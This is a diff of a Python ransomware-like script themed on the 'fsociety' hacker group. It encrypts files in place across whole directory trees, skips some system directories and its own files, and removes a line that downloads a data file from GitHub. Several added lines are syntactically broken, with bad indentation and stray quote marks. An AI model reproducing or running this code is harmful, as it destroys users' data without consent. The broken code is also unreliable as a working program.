@@ -16,24 +16,25 @@ CS = 64*1024
 
 
 def encrypt(root, filename, key):
-    file_path = root + '/' + filename
-    file_size = str(os.path.getsize(file_path)).zfill(16)
-    iv = Random.new().read(16)
-    encryptor = AES.new(key, AES.MODE_CBC, iv)
-    try:
-        with open(file_path, 'rb') as infile:
-            with open(file_path, 'wb') as outfile:
-                outfile.write(file_size.encode('utf-8'))
-                outfile.write(iv)
-                while True:
-                    chunk = infile.read(CS)
-                    if len(chunk) == 0:
-                        break
-                    elif len(chunk) % 16 != 0:
-                        chunk += b' ' * (16 - (len(chunk) % 16))
-                    outfile.write(encryptor.encrypt(chunk))
-    except:
-        pass
+    if ('fuxsocy.py' not in filename) and ('fsociety00.dat' not in filename):
+        file_path = root + '/' + filename
+        file_size = str(os.path.getsize(file_path)).zfill(16)
+        iv = Random.new().read(16)
+        encryptor = AES.new(key, AES.MODE_CBC, iv)
+        try:
+            with open(file_path, 'rb') as infile:
+                with open(file_path, 'wb') as outfile:
+                    outfile.write(file_size.encode('utf-8'))
+                    outfile.write(iv)
+                    while True:
+                        chunk = infile.read(CS)
+                            if len(chunk) == 0:
+                            break
+                        elif len(chunk) % 16 != 0:
+                            chunk += b' ' * (16 - (len(chunk) % 16))
+                        outfile.write(encryptor.encrypt(chunk))
+        except:
+            pass
 
 def recurse(directory, key):
     root = next(os.walk(directory))[0]
@@ -110,19 +111,18 @@ def pwn():
     dirs = next(os.walk(START_DIR))[1]
     time.sleep(0.7)
     print('beginning crypto operations')
-    subprocess.call(["wget", "https://raw.githubusercontent.com/joekendal/fsociety/master/fsociety00.dat"])
     for dir in dirs:
         if START_DIR == '/':
             directory = START_DIR + dir
         else:
             directory = START_DIR + '/' + dir
-        print('Encrypting {}'.format(directory))
-        recurse(directory, key)
+        if (directory != '/run') and (directory != '/lib') and (directory != '/proc')"
+            print('Encrypting {}'.format(directory))
+            recurse(directory, key)
     files = next(os.walk(START_DIR))[2]
     for file in files:
         try:
-            if file != "fsociety00.dat""
-                encrypt(START_DIR, file, key)
+            encrypt(START_DIR, file, key)
         except:
             pass
     del key
